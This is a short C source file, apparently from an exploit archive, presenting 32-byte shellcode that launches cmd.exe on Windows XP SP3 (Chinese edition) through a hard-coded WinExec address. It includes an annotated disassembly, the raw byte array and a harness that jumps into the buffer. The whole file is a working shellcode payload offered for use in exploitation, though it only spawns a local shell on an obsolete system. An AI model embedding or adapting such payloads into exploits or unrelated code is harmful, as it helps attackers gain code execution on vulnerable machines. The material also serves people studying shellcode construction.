///////////////////////////////////////////////////////////////////////////////
//-----------------------------------------------------------------------------
//              windows/XP sp3  Sellcode cmd.exe 32 bytes
// It is 32 Byte Shellcode which Execute Cmd.exe Tested Under Windows Xp SP3 CN
//
//Assembly Code :
//00423328    8BEC            MOV EBP,ESP
//0042332A    33FF            XOR EDI,EDI
//0042332C    57              PUSH EDI
//0042332D    C645 FC 63      MOV BYTE PTR SS:[EBP-4],63
//00423331    C645 FD 6D      MOV BYTE PTR SS:[EBP-3],6D
//00423335    C645 FE 64      MOV BYTE PTR SS:[EBP-2],64
//00423339    C645 F8 01      MOV BYTE PTR SS:[EBP-8],1
//0042333D    8D45 FC         LEA EAX,DWORD PTR SS:[EBP-4]
//00423340    50              PUSH EAX
//00423341    B8 AD23867C     MOV EAX,kernel32.WinExec	//win xp sp3中文版上的WinExec硬编码地址0x7C8623AD
//00423346    FFD0            CALL EAX
//-----------------------------------------------------------------------------
///////////////////////////////////////////////////////////////////////////////

#include <stdio.h>
#include <string.h>


unsigned char xp_sp3_shellcode[] =
"\x8B\xEC"
"\x33\xFF"
"\x57"
"\xC6\x45\xFC\x63"
"\xC6\x45\xFD\x6D"
"\xC6\x45\xFE\x64"
"\xC6\x45\xF8\x01"
"\x8D\x45\xFC"
"\x50"
"\xB8\xAD\x23\x86\x7C"		
"\xFF\xD0";


int main (void){
    __asm{
		lea eax,xp_sp3_shellcode
		jmp eax
	}
	
    return 0;
}
